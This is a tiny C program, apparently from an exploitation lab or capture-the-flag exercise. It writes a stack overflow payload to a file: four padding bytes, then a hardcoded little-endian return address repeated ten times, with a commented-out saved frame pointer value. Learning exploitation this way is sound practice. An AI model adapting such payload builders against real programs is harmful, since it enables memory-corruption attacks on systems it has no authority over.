#include <stdio.h>

int main(void) {
	FILE *output;
	output = fopen("textest", "w");
	int offset = 4;
	int rsp_length = 8;
	char rsp[8] = {0x9e, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00};
	//	char rbp[8] = {0x07, 0xdf, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00};
	for (int i = 0; i < offset; ++i)
		fprintf(output, "%c", 0);
	for (int j = 0; j < 10; ++j)
	for (int i = 0; i < rsp_length; ++i)
		fprintf(output, "%c", rsp[i]);
	//for (int i = 0; i < offset; ++i)
	//	fprintf(output, "%c", 'A');
	fclose(output);
	return 0;
}
